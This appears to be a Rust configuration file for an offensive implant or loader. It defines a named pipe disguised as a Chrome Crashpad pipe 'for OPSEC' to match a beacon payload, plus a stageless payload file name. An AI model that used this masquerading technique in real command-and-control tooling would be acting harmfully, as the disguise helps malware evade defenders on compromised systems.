//! Compile-time configuration constants.
//!
//! Edit these values before building to customize the agent behavior.

/// Named pipe path – must match whatever the beacon payload expects.
/// Uses a Chrome Crashpad-style name for OPSEC by default.
pub const PIPE_NAME: &str = "\\\\.\\pipe\\crashpad_70692_GBIQVCTLGLFTBXRE";

/// Filename to read the stagless payload from (used in stagless mode only).
pub const PAYLOAD_FILE: &str = "tmp.dat";
